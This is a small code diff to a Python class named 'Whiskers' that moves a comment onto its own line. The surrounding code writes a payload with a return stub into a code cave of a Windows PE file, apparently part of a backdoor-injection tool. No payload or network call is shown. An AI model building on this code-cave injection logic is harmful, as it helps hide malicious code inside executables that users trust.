@@ -234,7 +234,9 @@ class Whiskers:
                 return_stub += struct.pack('<i', return_offset)
                 
                 # Add return stub to payload
-                payload_with_return = payload + return_stub# Update PE data with payload that includes return stub
+                payload_with_return = payload + return_stub
+                
+                # Update PE data with payload that includes return stub
                 for i, byte in enumerate(payload_with_return):
                     pe_data[code_cave['offset'] + i] = byte
             
